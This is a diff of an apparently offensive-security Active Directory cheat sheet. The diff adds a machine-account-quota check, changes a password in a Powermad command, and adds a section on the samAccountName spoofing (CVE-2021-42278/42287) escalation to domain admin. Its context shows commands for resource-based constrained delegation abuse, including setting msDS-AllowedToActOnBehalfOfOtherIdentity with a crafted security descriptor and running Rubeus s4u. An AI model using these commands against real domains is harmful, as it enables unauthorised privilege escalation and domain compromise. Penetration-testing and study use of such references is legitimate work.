@@ -1109,6 +1109,8 @@ To abuse RBCD we need write privileges on a server so we can set the _msDS-Allow
 
 For the computer object we can simply create a new machine account (with SPN), identify the corresponding SID, set that in the writable Server's _msDS-AllowedToActOnBehalfOfOtherIdentity_ property, and then run ```Rubeus s4u``` as we did for constrained delegation.
 
+Check whether a user account object can create a new machine account (each can create 10 new machine accounts by default): ```Get-DomainObject -Identity Bob -Properties ms-DS-MachineAccountQuota```
+
 **Note:** The most important thing to understand here is unlike unconstrained/constrained delegation, we dont need prior access to the machine. All we need is write privileges in the form of an appropriate ACL ("Owner" "WriteProperty" "GenericWrite") on ANY computer object. We can then set the _msDS-AllowedToActOnBehalfOfOtherIdentity_ property to a SID that we control (any domain account account that has an SPN i.e., a machine account we can create).
 
 Therefore if we have ```"Owner"``` ```"WriteProperty"``` or ```"GenericWrite"``` permissions to ANY computer object within an environment, we can attain localadmin on that machine by way of RBCD.
@@ -1121,7 +1123,7 @@ Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Memb
 
 create machine account (with powermad) and run s4u:
 ```
-New-MachineAccount -MachineAccount <MachineAccountName> -Password $(ConvertTo-SecureString 'p@ssword!' -AsPlainText -Force) -Verbose
+New-MachineAccount -MachineAccount <MachineAccountName> -Password $(ConvertTo-SecureString 'Password01' -AsPlainText -Force) -Verbose
 
 $ComputerSid = Get-DomainComputer <MachineAccountName> -Properties objectsid | Select -Expand objectsid
 $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
@@ -1146,6 +1148,13 @@ $Descriptor.DiscretionaryAcl
 **NOTE:** In Constrained and Resource-Based Constrained Delegation if we don't have the password/hash of the account with TRUSTED_TO_AUTH_FOR_DELEGATION that we try to abuse, we can use the very nice trick "tgt::deleg" from kekeo or "tgtdeleg" from rubeus and fool Kerberos to give us a valid TGT for that account. Then we just use the ticket instead of the hash of the account to perform the attack.
 
 -https://github.com/In3x0rabl3/OSEP/blob/main/osep_reference.md#pass-the-hash--cme--impacket--nc
+
+#### Using new machine to create DC$ name search order attack to get DA
+You can also create a new machine account, request a TGT, then remove the SPN and rename the same as a Domain Controller without the ```$``` - if vulnerable the Domain controller will research all machine names appending the ```$``` and will grant a TGS with permissions of the DC to your rogue DC-named machine account!
+
+https://4sysops.com/archives/exploiting-the-cve-2021-42278-samaccountname-spoofing-and-cve-2021-42287-deceiving-the-kdc-active-directory-vulnerabilities/
+
+
 
 # DNS Admins
 https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83
